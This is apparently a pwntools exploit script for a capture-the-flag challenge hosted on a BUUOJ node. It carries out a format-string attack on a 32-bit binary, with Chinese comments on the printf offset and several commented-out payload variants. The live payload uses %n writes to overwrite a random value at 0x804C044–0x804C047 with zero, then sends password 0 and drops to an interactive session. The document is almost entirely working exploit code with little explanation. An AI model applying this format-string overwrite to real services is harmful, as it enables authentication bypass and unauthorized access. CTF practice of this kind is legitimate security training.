from pwn import*

p=remote('node4.buuoj.cn',28721);                                               # 32位程序
                                                                                # printf偏移量为10，从右到左依次压栈，使用时取值
#payload=b'A'*4+p32(0x804C044)+p32(0x804C045)+p32(0x804C046)+p32(0x804C047)     # AAAA为第10个参数，以此类推
#payload+=b'%11$n%12$n%13$n%14$n'                                               # 修改 0x804C044 地址的值 ...
#p.sendline(str(0x14141414))

#payload=p32(0x804C044)+p32(0x804C045)+p32(0x804C046)+p32(0x804C047)            # 0x804C044为第10个参数，以此类推
#payload+=b'%10$n%11$n%12$n%13$n'
#p.sendline(str(0x10101010))

#payload=b'MM%12$nM' + p32(0x804C044)
#p.sendline(str(2))

payload = b'%15$n%16$n%17$n%18$n' + p32(0x804C044) + p32(0x804C045) + p32(0x804C046) + p32(0x804C047)
#p.sendline(str(0x0))

#p.recvuntil('name:')
p.sendline(payload)#修改随机数
#p.recvuntil('passwd')
p.sendline(str(0))#输入密码
p.interactive()
